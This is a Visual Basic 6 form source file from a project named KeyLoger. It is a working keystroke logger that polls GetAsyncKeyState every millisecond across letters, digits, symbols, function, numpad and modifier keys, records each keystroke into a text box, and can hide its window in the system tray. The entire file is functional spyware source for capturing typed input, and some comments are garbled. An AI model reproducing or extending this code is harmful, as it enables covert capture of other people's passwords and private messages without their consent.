VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  '´ÜÀÏ °íÁ¤
   Caption         =   "Main"
   ClientHeight    =   3720
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   4725
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3720
   ScaleWidth      =   4725
   StartUpPosition =   3  'Windows ±âº»°ª
   Begin KeyLoger.TrayControl TrayControl1 
      Left            =   360
      Top             =   2640
      _ExtentX        =   794
      _ExtentY        =   794
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Æ®·¹ÀÌ¸ðµå"
      Height          =   495
      Left            =   -120
      TabIndex        =   1
      Top             =   2520
      Width           =   1455
   End
   Begin VB.Timer tmrShift 
      Interval        =   2
      Left            =   3480
      Top             =   2640
   End
   Begin VB.TextBox Text1 
      Height          =   2535
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  '¼öÁ÷
      TabIndex        =   0
      Top             =   0
      Width           =   4695
   End
   Begin VB.Timer tmrKey 
      Interval        =   1
      Left            =   4080
      Top             =   2640
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Scroll As Boolean
Private shift As Boolean
Private Caps As Boolean
Private KeyResult As Long
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Sub AddKey(Key As String)
Text1 = Text1 & Key
Text1.SelStart = Len(Text1)
End Sub

Private Sub Command1_Click()
TrayControl1.SendToTray
End Sub

Private Sub form_mousemove(button As Integer, shift As Integer, X As Single, Y As Single)
If X / Screen.TwipsPerPixelX = &H203 Then
    TrayControl1.RestoreFromTray

End If
End Sub


Private Sub tmrKey_Timer()
'Caption = GetAsyncKeyState(16)
'GoTo KeyFound
KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey "[ENTER]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(17)
    If KeyResult = -32767 Then
        AddKey "[CTRL]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        AddKey "[BKSPACE]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(9)
    If KeyResult = -32767 Then
        AddKey "[TAB]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(18)
    If KeyResult = -32767 Then
        AddKey "[ALT]"
        GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(19)
    If KeyResult = -32767 Then
        AddKey "[PAUSE]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(20)
    If KeyResult = -32767 Then
        If Caps Then
            AddKey "[CapsOff]"
            Caps = False
        Else
            AddKey "[CapsOn]"
            Caps = True
        End If
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(27)
    If KeyResult = -32767 Then
        AddKey "[ESC]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(33)
    If KeyResult = -32767 Then
        AddKey "[PGUP]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(34)
    If KeyResult = -32767 Then
        AddKey "[PGDN]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(35)
    If KeyResult = -32767 Then
        AddKey "[END]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(36)
    If KeyResult = -32767 Then
        AddKey "[HOME]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(44)
    If KeyResult = -32767 Then
        AddKey "[SYSRQ]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(45)
    If KeyResult = -32767 Then
        AddKey "[INS]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(46)
    If KeyResult = -32767 Then
        AddKey "[DEL]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(144)
    If KeyResult = -32767 Then
        AddKey "[NUM]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(37)
    If KeyResult = -32767 Then
        AddKey "[LEFT]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(38)
    If KeyResult = -32767 Then
        AddKey "[UP]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(39)
    If KeyResult = -32767 Then
        AddKey "[RIGHT]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(40)
    If KeyResult = -32767 Then
        AddKey "[DOWN]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(91)
    If KeyResult = -32767 Then
        AddKey "[WINDOWS]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(92)
    If KeyResult = -32767 Then
        AddKey "[WINDOWS]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(93)
    If KeyResult = -32767 Then
        AddKey "[PROPERTIES]"
        GoTo KeyFound
    End If
    
'Keys
For i = 65 To 90 'Áóêâèòå
    KeyResult = GetAsyncKeyState(i)
        If KeyResult = -32767 Then
            If shift Then
                If Caps Then AddKey Chr(i + 32) Else AddKey Chr(i)
            Else
                If Caps Then AddKey Chr(i) Else AddKey Chr(i + 32)
            End If
            GoTo KeyFound
        End If
Next i

For i = 48 To 57 '×èñëàòà
    KeyResult = GetAsyncKeyState(i)
        If KeyResult = -32767 Then
            If shift Then
                If i = 49 Then AddKey Chr(33) '!
                If i = 50 Then AddKey Chr(64) '@
                If i = 51 Then AddKey Chr(35) '#
                If i = 52 Then AddKey Chr(36) '$
                If i = 53 Then AddKey Chr(37) '%
                If i = 54 Then AddKey Chr(94) '^
                If i = 55 Then AddKey Chr(38) '&
                If i = 56 Then AddKey Chr(42) '*
                If i = 57 Then AddKey Chr(40) '(
                If i = 48 Then AddKey Chr(41) ')
            Else
                AddKey Chr(i)
            End If
            GoTo KeyFound
        End If
Next i

KeyResult = GetAsyncKeyState(16) '219
    If KeyResult = -32767 And Not shift Then
        AddKey "[ShiftDown]"
        shift = True
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey "[SPACE]"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        If shift Then AddKey "_" Else AddKey "-"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        If shift Then AddKey "+" Else AddKey "="
        GoTo KeyFound
    End If
    
'------------FUNCTION KEYS

KeyResult = GetAsyncKeyState(112)
    If KeyResult = -32767 Then
        AddKey "[F1]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(113)
    If KeyResult = -32767 Then
        AddKey "[F2]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(114)
    If KeyResult = -32767 Then
        AddKey "[F3]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(115)
    If KeyResult = -32767 Then
        AddKey "[F4]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(116)
    If KeyResult = -32767 Then
        AddKey "[F5]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(117)
    If KeyResult = -32767 Then
        AddKey "[F6]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(118)
    If KeyResult = -32767 Then
        AddKey "[F7]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(119)
    If KeyResult = -32767 Then
        AddKey "[F8]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(120)
    If KeyResult = -32767 Then
        AddKey "[F9]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(121)
    If KeyResult = -32767 Then
        AddKey "[F10]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(122)
    If KeyResult = -32767 Then
        AddKey "[F11]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(123)
    If KeyResult = -32767 Then
        AddKey "[F12]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(124)
    If KeyResult = -32767 Then
        AddKey "[F13]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(125)
    If KeyResult = -32767 Then
        AddKey "[F14]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(126)
    If KeyResult = -32767 Then
        AddKey "[F15]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(127)
    If KeyResult = -32767 Then
        AddKey "[F16]"
        GoTo KeyFound
    End If
    
'Special Keys
KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        If shift Then AddKey ":" Else AddKey ";"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        If shift Then AddKey "<" Else AddKey ","
        GoTo KeyFound
    End If
     
KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        If shift Then AddKey ">" Else AddKey "."
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        If shift Then AddKey "?" Else AddKey "/"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        If shift Then AddKey "~" Else AddKey "`" '`
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        If shift Then AddKey Chr(34) Else AddKey "'"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        If shift Then AddKey "|" Else AddKey "\"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        If shift Then AddKey "}" Else AddKey "]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(219) '219
    If KeyResult = -32767 Then
        If shift Then AddKey "{" Else AddKey "["
        GoTo KeyFound
    End If

'----------NUM PAD
KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        AddKey "0"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        AddKey "1"
        GoTo KeyFound
    End If
     

KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        AddKey "2"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        AddKey "3"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        AddKey "4"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        AddKey "5"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        AddKey "6"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        AddKey "7"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        AddKey "8"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        AddKey "9"
        GoTo KeyFound
    End If
       
    
KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        AddKey "*"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        AddKey "+"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        AddKey "[ENTER]"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        AddKey "-"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        AddKey "."
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(111)
    If KeyResult = -32767 Then
        AddKey "/"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(145)
    If KeyResult = -32767 Then
        If Scroll Then
            AddKey "[ScrollLockOff]"
            Scroll = False
        Else
            AddKey "[ScrollLockOn]"
            Scroll = True
        End If
        GoTo KeyFound
    End If

KeyFound:

End Sub
Private Sub tmrShift_Timer()
If shift Then
    KeyResult = GetAsyncKeyState(16) '219
    If KeyResult <> -32767 And KeyResult <> -32768 Then
        AddKey "[ShiftUp]"
        shift = False
    End If
End If
End Sub
